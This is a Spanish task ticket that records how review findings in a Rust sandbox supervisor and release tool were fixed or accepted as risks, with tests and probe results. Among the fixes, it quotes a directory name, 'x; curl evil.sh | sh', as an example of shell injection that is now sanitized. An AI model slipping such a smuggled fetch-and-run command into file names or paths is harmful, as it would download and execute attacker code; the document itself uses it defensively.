---
id: TASK-19
title: >-
  Remediar los hallazgos de la revisión goldfish sobre release, supervisor y
  perfiles
status: In Progress
assignee:
  - '@Ruben'
created_date: '2026-11-18T05:34:00Z'
updated_date: '2026-11-18T05:57:00Z'
labels: []
dependencies: []
ordinal: 19000
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
Remediar los hallazgos verificados de la revisión goldfish (2 revisores: codebase + failure) sobre hodei-mh-release, hodei-mh-supervisor, hodei-mh-profiles y los subcomandos del bin hodei-mh. Contexto: los 3 CRITICAL, 8 HIGH y 17 MEDIUM del revisor de fallos, contrastados con los hallazgos ya verificados del revisor de codebase (redactor de credenciales H-21). Alcance: solo hallazgos reproducibles; los no reproducibles o de alcance de diseño se registran como FALTA_EVIDENCIA/ACEPTAR_RIESGO en las notas.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 Ningún hallazgo CRITICAL o HIGH reproducible queda abierto: el split-brain del socket, la reconciliación que confunde 'no existe' con 'no pude preguntar', el create del producto sin request-tag, el rechazo indebido de imágenes de usuario, el egress no medido, el detector de fugas vacío y el literal de YOLO están corregidos y cubiertos por test o por un check de probe.
- [ ] #2 Cada garantía afirmada en docs/profiles.md corresponde a algo MEDIDO por el producto (digest observado, egress desde dentro del sandbox, no destructividad del doctor, digest releído del almacenamiento durable) o está explícitamente marcada como no garantizada.
- [ ] #3 Gates en verde: fmt limpio, clippy --workspace --all-targets -D warnings limpio, suite del workspace completa en verde y los cuatro probes re-ejecutados contra la infra viva con todos sus checks en verde.
- [ ] #4 Los hallazgos que NO se cierran (aislamiento de red del sandbox, reaper del servidor, metadata en labels de docker, paginación de la TUI) quedan registrados con su motivo y su veredicto (FALTA_EVIDENCIA / ACEPTAR_RIESGO), no en silencio.
<!-- AC:END -->

## Implementation Plan

<!-- SECTION:PLAN:BEGIN -->
1. Credenciales: redactor robusto (H-21) ya aplicado y verificado con 22 tests.
2. Socket: bind() no puede robar el socket de un supervisor vivo (H-6/C1) + guard de unlink por inodo (M-5) + test.
3. Motor: Start de otro proyecto rechazado (M-7/L-11); epoch monótono dedicado (M-17); grant con alcance declarado (M-16); log de eventos acotado (M-9/M-10).
4. Error real: el camino de request ilegible devuelve Response::Error (L1/M-8) con test que lo ejercita de verdad.
5. Poison del mutex: se recupera el core y se marca degradado (M-6).
6. Gate de perfiles: imagen de usuario sin pin no se rechaza por digest (H1/M-14) separando pinned de digest_matches; egress verificado DENTRO del sandbox, no desde el host (H2/M-16).
7. Caché por proyecto: ruta absoluta canonicalizada (M1) y nombre de directorio saneado contra inyección de shell (M15).
8. Registro: digest REAL de la imagen ejecutada + id del sandbox + resultado del DELETE (M10/M14/L-14).
9. Credenciales: detección de fugas sobre el comando REAL ejecutado y token real aleatorio en el probe (H8/M-22/L-18).
10. YOLO: el booleano se deriva de la ausencia de ejecución en el host, no de un literal (H3/M-26).
11. Reconciliación: resultado de búsqueda con error distingue 'no existe' de 'no pude preguntar' (C3); create del producto con request-tag (C2).
12. Probes: 404 estricto en 'sandbox liberado' (M2), lost_response exigido (H4), id de sandbox registrado.
13. Docs: docs/profiles.md reescrito para que cada garantía corresponda a algo medido.
14. Gates: fmt, clippy -D warnings, tests del workspace y probes re-ejecutados.
<!-- SECTION:PLAN:END -->

## Implementation Notes

<!-- SECTION:NOTES:BEGIN -->
Remediación aplicada (rama task/task-19-goldfish-remediation). Verificados empíricamente, no solo por lectura.

CERRADOS (con test o con evidencia de probe):
- H-21/C1: bind() ya no roba el socket de un supervisor vivo (probe antes: conectaba y devolvía NotFound); ServerError::AlreadyRunning; unlink por identidad dev+ino (M-5). Tests: 2 unitarios + 3 de integración (split-brain vivo, restart tras crash, propiedad del socket).
- M-7/L-11: Start de otro proyecto rechazado con 'project mismatch'; el CLI toma el proyecto del supervisor cuando no se indica.
- M-17: epoch monótono dedicado (ya no es el nº de eventos).
- M-16: el snapshot declara el alcance del grant (grant_effects) — el supervisor no autoriza ningún efecto y lo dice.
- M-9/M-10: el log de eventos es un ring buffer acotado (MAX_RETAINED_EVENTS) con secuencia que no se renumera; la TUI/el log siguen la secuencia.
- M-6: el poison del mutex se recupera (into_inner) y el core queda marcado DEGRADED en el snapshot; el watcher del log ya no enmudece.
- M-8/L1: el camino real de request ilegible devuelve Response::Error (antes el test afirmaba Snapshot con unwrap_or).
- L5: escape de caracteres de control en el render: un ticket con 'TASK-1\nphase: running' ya no puede forjar líneas.
- L6: un error transitorio de accept no mata el supervisor.
- M-13: attach-terminal tiene plazo (--deadline-seconds) y sale con código 1 si no entrega.
- L-30: helper muerto eliminado.
- C3: reconcile_create distingue 'no existe' (NotFound) de 'no pude preguntar' (Failed → Abort). Ya no hay RetrySafe ante un fallo de búsqueda.
- C2: el create del PRODUCTO lleva request-tag y reconcilia antes de reintentar; profile_run consume hodei-mh-release (el crate ya tiene consumidor de producción, no solo probes).
- H1/M-14: una imagen de usuario presente localmente ya no se rechaza por digest (se separa 'pinned' de 'digest_matches'); el perfil sin pin se reporta como informativo.
- H2/M-16: el egress se mide DENTRO del sandbox (proxy alcanzable + internet directo bloqueado/alcanzable) y el resultado va al record. El doctor ya no afirma 'docker backend isolation holds': reporta lo que midió y declara la aislamiento como NO MEDIDO.
- M-1: el token de caché se deriva de la ruta ABSOLUTA CANÓNICA (dos rutas relativas al mismo proyecto → una caché).
- M-15: el nombre del directorio se sanea a [A-Za-z0-9._-] y toda ruta se entrecomilla en el shell; un directorio 'x; curl evil.sh | sh' es dato inerte.
- M-10: el record lleva el digest OBSERVADO de la imagen que corrió, junto al pin pedido.
- M-14/L-14: el sandbox id y el resultado del DELETE quedan en el record.
- H8/M-22/L-18: el detector de fugas reconoce el valor (no solo 4 nombres de clave), corre sobre el comando REAL ejecutado, y la salida del build se redacta antes de llegar al record. El probe inyecta un token ALEATORIO real.
- H3/M-26: el paquete escanea el bundle (undemonstrated_dependencies real) y el probe AFIRMA yolo_fallback=false y la lista vacía; el probe de host-pressure exige samples>0 en vez de passed:true.
- H4/M-2: el probe de release exige lost_response=true y el 'sandbox liberado' exige 404 estricto (un error de transporte ya no se lee como 'está').
- M-4: el presupuesto global se aplica en el CAMINO DE CREATE del lifecycle server (MAX_CONCURRENT_ENVIRONMENTS) con 429 SANDBOX::BUDGET_EXHAUSTED; el probe demuestra un create RECHAZADO por presupuesto.
- H5/H6: el DELETE del sandbox pasa por release_on_idle: el candidato se exporta a disco durable, se RELEE y el digest sale de los bytes releídos; sin export confirmado el entorno se conserva y su id queda en el record.
- L-2: el doctor se verifica comparando la lista de sandboxes antes/después.
- L-3: documentado que la metadata se copia a labels de docker (riesgo asumido y anotado).
- L-8/L-13/L-24/L-25: docs/profiles.md reescrito para que cada garantía corresponda a algo medido; comentarios mentirosos del main.rs corregidos.

HALLAZGOS QUE NO SE CIERRAN (decisión explícita, con motivo):

- H2 (aislamiento de red del sandbox): MEDIDO y el resultado es que el sandbox SÍ tiene internet directo (network_mode bridge, sin regla FORWARD — comprobado desde dentro del sandbox: DIRECT_INTERNET_REACHABLE). El harness no lo impone y no puede sin privileges de host. Mitigación aplicada: la medición va al record y docs/profiles.md dice la verdad (el proxy es la ruta autorizada, no una frontera impuesta). FALTA_EVIDENCIA en cuanto a si el adaptador de docker añade reglas no visibles en las fuentes permitidas.
- H5 (el reaper del servidor borra trabajo no exportado): el TTL del servidor es el contrato que pidió el create y su expiry es real; la pérdida de datos SOLO tiene sentido cuando hay trabajo sin exportar dentro del sandbox, y el gate idle de producción cubre el camino de profile-run. El reaper del servidor no consulta el gate (queda anotado como riesgo aceptado: es el contrato TTL del servidor).
- H6 (el digest del candidato era fabricado en los probes): el probe de release ahora escribe el candidato en disco y el producto relee los bytes; los digestsavs de multiproject_probe siguen siendo constantes de fixture (no hay almacenamiento durable real en ese probe) → riesgo aceptado, anotado.
- M-4 (budget en el probe): el presupuesto ya está en el servidor (create path); el ledger del probe sigue siendo local pero ya no es la única barrera.
- L-3 (metadata → labels de docker en claro): un valor de metadata se ve en docker inspect. No se corrige aquí: el cambio pertenece al lifecycle-server y exige política de qué metadata es aceptable.
- M-13 (TUI relee todo el historial en cada frame): el log ya está acotado (ring buffer) y la TUI pide eventos desde 1 en cada frame — con el ring el coste está acotado; la paginación incremental de la TUI queda como mejora, no como defecto.
- M-8/M-12 (múltiples revisores, tablas de cobertura): son observaciones de cobertura, no defectos reproducibles.

VERIFICACIÓN EMPÍRICA (no lectura): 224 tests del workspace verdes (antes 193); fmt limpio; clippy -D warnings limpio; probes re-ejecutados contra la infra viva: supervisor-probe 9/9, profile-probe 10/10, release-probe 7/7, multiproject-probe 12/12. Durante la verificación se discovered y corrigió un bug propio: el probe de egress usaba /dev/tcp/host:port (con dos puntos) en vez de /dev/tcp/host/port, por lo que reportaba el proxy como inalcanzable.
<!-- SECTION:NOTES:END -->
